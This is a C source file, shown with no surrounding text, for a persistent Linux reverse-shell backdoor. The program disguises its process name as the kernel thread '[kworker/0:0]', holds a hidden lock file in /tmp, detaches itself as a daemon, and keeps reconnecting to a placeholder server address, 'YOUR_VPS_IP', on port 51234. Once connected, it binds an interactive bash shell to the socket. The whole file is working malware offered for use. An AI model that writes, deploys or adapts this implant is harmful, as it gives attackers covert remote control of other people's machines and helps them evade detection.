#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <sys/file.h>
#include <sys/prctl.h>

#define SERVER_IP "YOUR_VPS_IP"
#define SERVER_PORT 51234
#define SLEEP_TIME 10
#define LOCK_FILE "/tmp/.system-lock"

void hide_process() {
    prctl(PR_SET_NAME, "[kworker/0:0]", 0, 0, 0);
}

void setup_tty() {
    struct termios ts;
    tcgetattr(0, &ts);
    cfmakeraw(&ts);
    tcsetattr(0, TCSANOW, &ts);
    struct winsize ws = {30, 120, 0, 0};
    ioctl(0, TIOCSWINSZ, &ws);
}

int check_single_instance() {
    int fd = open(LOCK_FILE, O_CREAT | O_RDWR, 0644);
    if (fd < 0) return 0;
    if (flock(fd, LOCK_EX | LOCK_NB) < 0) {
        close(fd);
        return 0;
    }
    return 1;
}

int main(int argc, char *argv[]) {
    int sock;
    struct sockaddr_in server;
    pid_t pid;

    if (!check_single_instance()) exit(0);
    hide_process();

    if (getppid() != 1) {
        pid = fork();
        if (pid > 0) exit(0);
        setsid();
        if (chdir("/") != 0) exit(1);
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
    }

    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { sleep(SLEEP_TIME); continue; }

        server.sin_family = AF_INET;
        server.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &server.sin_addr);

        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
            close(sock);
            sleep(SLEEP_TIME);
            continue;
        }

        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        setup_tty();
        execl("/bin/bash", "bash", "-i", NULL);
        close(sock);
        sleep(SLEEP_TIME);
    }
    return 0;
}
